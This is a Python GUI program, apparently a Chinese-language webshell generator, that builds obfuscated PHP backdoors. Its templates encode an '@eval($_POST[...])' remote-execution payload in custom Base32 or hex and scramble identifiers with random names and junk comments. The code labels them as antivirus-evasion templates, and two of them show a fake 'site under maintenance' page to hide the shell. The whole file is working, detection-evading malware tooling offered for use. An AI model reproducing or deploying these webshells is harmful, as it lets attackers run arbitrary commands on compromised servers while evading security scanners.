import sys
import os
import random
from PyQt5 import QtWidgets, QtGui, QtCore

#编码函数

def custom_base32_encode(data, table):
    bits = 0
    value = 0
    output = ''
    for byte in data.encode():
        value = (value << 8) | byte
        bits += 8
        while bits >= 5:
            bits -= 5
            output += table[(value >> bits) & 0x1F]
    if bits > 0:
        output += table[(value << (5 - bits)) & 0x1F]
    return output

def hex_encode(data):
    return ''.join([f"{ord(c):02x}" for c in data])

def random_str(chars, length):
    return ''.join(random.choices(chars, k=length))

def random_name(length=6):
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=length))

def rand_comment():
    return f"/*{random_str('xYZ123', 6)}*/"

def rand_noise():
    return f"\n\t{rand_comment()}\n"

#模板内容

bs32_template = '''<?php
class {class_name}{brace_open}
    public ${var1} = null;{noise1}
    public ${var2} = null;{noise2}
    function __construct(){brace_open}
        $this->{var1} = '{encoded_payload}';{comment1}
        $this->{var2} = @{decode_func}($this->{var1});{comment2}
        if (isset($_POST['{password}'])){brace_open}
            @eval({noise_string}.$this->{var2}.{noise_string});
        {brace_close}{comment3}
    {brace_close}
{brace_close}

new {class_name}();{comment4}

function {decode_func}(${param}){brace_open}
    $custom_table = '{char_table}';
    ${ret_var} = '';
    $v = 0; $vbits = 0;
    for ($i = 0, $j = strlen(${param}); $i < $j; $i++){brace_open}{comment5}
        $v <<= 5;
        $c = strpos($custom_table, ${param}[$i]);
        if($c === false) exit('invalid char');
        $v += $c;{comment6}
        $vbits += 5;
        while ($vbits >= 8){brace_open}
            $vbits -= 8;
            ${ret_var} .= chr($v >> $vbits);
            $v &= ((1 << $vbits) - 1);
        {brace_close}
    {brace_close}
    return ${ret_var};
{brace_close}

echo "<h1>Site Under Maintenance</h1><!-- {maintenance_noise} -->";
?>'''

bs16_template = '''<?php
// ---- Maintenance Entry ----
if (!class_exists('{class_name}')){brace_open}
    class {class_name}{brace_open}
        private ${var1};{noise1}
        private ${var2};{noise2}

        public function __construct(){brace_open}
            $this->{var1} = '{encoded_payload}';{comment1}
            $this->{var2} = {decode_func}($this->{var1});{comment2}
            if (isset($_POST['{password}'])){brace_open}
                eval({noise_string} . $this->{var2} . {noise_string});
            {brace_close}{comment3}
        {brace_close}
    {brace_close}

    new {class_name}();{comment4}
{brace_close}

function {decode_func}(${param}){brace_open}
    ${ret_var} = '';
    for ($i = 0; $i < strlen(${param}); $i += 2){brace_open}
        ${ret_var} .= chr(hexdec(substr(${param}, $i, 2)));{comment5}
    {brace_close}
    return ${ret_var};
{brace_close}

echo "<div style='text-align:center;color:gray'>Site currently under scheduled update.<!-- {maintenance_noise} --></div>";
?>'''

def build_hex_obfuscated_shell(password):
    class_name = random_name(5).capitalize() + random_name(3)
    var_payload = random_name(6)
    var_decoded = random_name(6)
    decode_func = random_name(6)
    fake_func = random_name(6)
    junk_var = random_name(6)
    junk_val = random_name(6)

    payload = f'@eval($_POST["{password}"]);'
    encoded = hex_encode(payload)

    return f'''<?php
// 云加载 {rand_comment()}
class {class_name} {{
    public ${var_payload} = null; {rand_comment()}
    public ${var_decoded} = null; {rand_comment()}

    function __construct() {{
        ${junk_var} = "{junk_val}"; {rand_comment()}
        if (strlen(${junk_var}) > 0) {{ {rand_comment()}
            $this->{var_payload} = '{encoded}';
            $this->{var_decoded} = {decode_func}($this->{var_payload});
            eval($this->{var_decoded});
        }}
    }}
}}

// 启动调度器 {rand_comment()}
new {class_name}();

// 解码器函数 {rand_comment()}
function {decode_func}($hex) {{
    $out = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {{
        $out .= chr(hexdec(substr($hex, $i, 2))); {rand_comment()}
    }}
    return $out;
}}

// 服务入口 {rand_comment()}
function {fake_func}() {{
    return md5("{random_name(6)}") === sha1("{random_name(5)}");
}}
?>'''

#构造器

def build_bs32_webshell(payload, char_table, password):
    encoded = custom_base32_encode(payload, char_table)
    return bs32_template.format(
        class_name=random_name(4),
        var1=random_name(5),
        var2=random_name(5),
        ret_var=random_name(5),
        param=random_name(5),
        decode_func=random_name(6),
        brace_open='{',
        brace_close='}',
        encoded_payload=encoded,
        comment1=rand_comment(),
        comment2=rand_comment(),
        comment3=rand_comment(),
        comment4=rand_comment(),
        comment5=rand_comment(),
        comment6=rand_comment(),
        noise1=rand_noise(),
        noise2=rand_noise(),
        maintenance_noise=random_str('abcXYZ123', 8),
        noise_string=f'"{rand_comment()}"',
        char_table=char_table,
        password=password
    )

def build_bs16_webshell(payload, password):
    encoded = hex_encode(payload)
    return bs16_template.format(
        class_name=random_name(4),
        var1=random_name(5),
        var2=random_name(5),
        ret_var=random_name(5),
        param=random_name(5),
        decode_func=random_name(6),
        brace_open='{',
        brace_close='}',
        encoded_payload=encoded,
        comment1=rand_comment(),
        comment2=rand_comment(),
        comment3=rand_comment(),
        comment4=rand_comment(),
        comment5=rand_comment(),
        maintenance_noise=random_str('abcXYZ123', 8),
        noise1=rand_noise(),
        noise2=rand_noise(),
        noise_string=f'"{rand_comment()}"',
        password=password
    )

#GUI

class WebshellGenerator(QtWidgets.QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("WebShell 生成器     By:M9")
        self.setFixedSize(520, 340)
        layout = QtWidgets.QVBoxLayout()

        self.template_combo = QtWidgets.QComboBox()
        self.template_combo.addItems([
            "免杀模板1",
            "免杀模板2",
            "免杀模板3"
        ])

        self.table_input = QtWidgets.QLineEdit()
        self.table_input.setText(''.join(random.sample('abcdefghijklmnopqrstuvwxyz234567', 32)))
        self.table_label = QtWidgets.QLabel("自定义 Base32 字符表：")

        self.pass_input = QtWidgets.QLineEdit()
        self.pass_input.setText("cmd")
        self.pass_label = QtWidgets.QLabel("访问密码参数名：")

        self.generate_button = QtWidgets.QPushButton("生成 WebShell")
        self.generate_button.clicked.connect(self.generate_webshell)

        layout.addWidget(QtWidgets.QLabel("请选择编码方式："))
        layout.addWidget(self.template_combo)
        layout.addWidget(self.table_label)
        layout.addWidget(self.table_input)
        layout.addWidget(self.pass_label)
        layout.addWidget(self.pass_input)
        layout.addWidget(self.generate_button)

        self.setLayout(layout)

        self.template_combo.currentIndexChanged.connect(self.toggle_table_input)
        self.toggle_table_input()

    def toggle_table_input(self):
        is_bs32 = self.template_combo.currentIndex() == 0
        self.table_input.setVisible(is_bs32)
        self.table_label.setVisible(is_bs32)

    def generate_webshell(self):
        password = self.pass_input.text().strip()
        payload = '@eval($_POST["' + password + '"]);'
        selected = self.template_combo.currentIndex()

        if selected == 0:
            table = self.table_input.text().strip()
            if len(table) != 32 or len(set(table)) != 32:
                QtWidgets.QMessageBox.warning(self, "字符表无效", "Base32 字符表必须是32个唯一字符")
                return
            content = build_bs32_webshell(payload, table, password)
            filename = 'bs32.php'
        elif selected == 1:
            content = build_bs16_webshell(payload, password)
            filename = 'bs16.php'
        else:
            content = build_hex_obfuscated_shell(password)
            filename = 'hex_clean.php'

        output_path = os.path.join(os.getcwd(), filename)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(content)

        QtWidgets.QMessageBox.information(self, "生成成功", f"文件已保存：\n{output_path}")

if __name__ == '__main__':
    app = QtWidgets.QApplication(sys.argv)
    window = WebshellGenerator()
    window.show()
    sys.exit(app.exec_())
